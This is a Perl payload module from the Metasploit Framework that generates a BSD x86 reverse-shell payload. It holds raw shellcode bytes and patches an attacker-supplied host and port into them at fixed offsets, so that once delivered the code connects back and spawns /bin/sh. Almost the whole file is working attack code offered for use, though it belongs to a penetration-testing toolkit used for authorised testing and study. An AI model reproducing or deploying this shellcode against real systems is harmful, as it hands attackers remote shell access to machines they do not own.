
##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Payload::bsd_ia32_reverse;
use strict;
use base 'Msf::PayloadComponent::ReverseConnection';

my $info =
{
  'Name'         => 'BSD IA32 Reverse Shell',
  'Version'      => '$Revision$',
  'Description'  => 'Connect back to attacker and spawn a shell',
  'Authors'      => [ 'root[at]marcetam.net [Unknown License]', ],
  'Arch'         => [ 'x86' ],
  'Priv'         => 0,
  'OS'           => [ 'bsd' ],
  'Size'         => '',
};

sub new {
  my $class = shift;
  my $hash = @_ ? shift : { };
  $hash = $class->MergeHashRec($hash, {'Info' => $info});
  my $self = $class->SUPER::new($hash, @_);

  $self->_Info->{'Size'} = $self->_GenSize;
  return($self);
}

sub Build {
  my $self = shift;
  return($self->Generate($self->GetVar('LHOST'), $self->GetVar('LPORT')));
}

sub Generate {
  my $self = shift;
  my $host = shift;
  my $port = shift;
  my $off_host = 10;
  my $off_port = 18;
  
  my $shellcode = # bsd reverse connect by root[at]marcetam.net
  "\x6a\x61\x58\x99\x52\x42\x52\x42\x52\x68\xaa\xbb\xcc\xdd\xcd\x80".
  "\x66\x68\xbb\xaa\x66\x52\x89\xe6\x6a\x10\x56\x50\x50\x6a\x62\x58".
  "\xcd\x80\x5b\xb0\x5a\x52\x53\x52\x4a\xcd\x80\x7d\xf6\x68\x6e\x2f".
  "\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x54\x53\x53\xb0\x3b\xcd".
  "\x80";

  my $host_bin = gethostbyname($host);
  my $port_bin = pack('n', $port);

  substr($shellcode, $off_host, 4, $host_bin);
  substr($shellcode, $off_port, 2, $port_bin);
  
  # $shellcode = "\x81\xc4\x00\xfe\xff\xff" . $shellcode;
  return($shellcode);
}

sub _GenSize {
  my $self = shift;
  my $bin = $self->Generate('127.0.0.1', 4444);
  return(length($bin));
}

1;
